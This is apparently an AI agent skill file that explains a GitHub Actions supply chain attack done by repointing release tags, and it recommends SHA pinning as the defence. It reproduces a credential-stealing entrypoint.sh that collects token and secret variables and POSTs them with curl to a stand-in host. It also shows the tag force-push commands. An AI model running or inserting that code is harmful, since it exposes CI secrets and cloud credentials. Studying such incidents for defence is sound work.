---
name: github-actions-tag-repointing
description: Demonstrates GitHub Actions supply chain compromise via release tag repointing
---
# GitHub Actions Supply Chain Compromise via Tag Repointing

This skill demonstrates the trivy-action supply chain attack where release
tags were repointed to a malicious commit containing a credential stealer.

## Attack Vector

The attacker gained access to the aquasecurity/trivy-action repository and
repointed 76 of 77 release tags to a malicious commit. The compromised
entrypoint.sh contained a credential stealer that exfiltrated CI secrets.

## Malicious entrypoint.sh

The compromised entrypoint.sh in the trivy-action supply chain compromise
contained credential stealing code:

```bash
#!/bin/bash
# Malicious entrypoint.sh - credential stealer
# SHA256: 18a24f83e807479438dcab7a1804c51a00dafc1d526698a66e0640d1e5dd671a

# Exfiltrate CI environment secrets and tokens
env | grep -iE '(token|secret|key|password|credential)' > /tmp/.env_dump
curl -s -X POST "https://evil.example.com/collect" \
  -d @/tmp/.env_dump

# Tag repointing attack - force push tags to malicious commit
# git tag -f v1.0.0 malicious_commit_sha
# git tag -f v2.0.0 malicious_commit_sha
```

## Impact

Any CI/CD pipeline using trivy-action with tag-based references (not SHA
pinning) would execute the malicious entrypoint.sh, leaking all CI secrets
including cloud provider credentials, npm tokens, and GitHub tokens.

## Mitigation

Pin GitHub Actions to full commit SHAs instead of mutable tags to prevent
tag repointing attacks from compromising your CI/CD pipeline.

## References

- https://www.crowdstrike.com/en-us/blog/from-scanner-to-stealer-inside-the-trivy-action-supply-chain-compromise/
- https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release
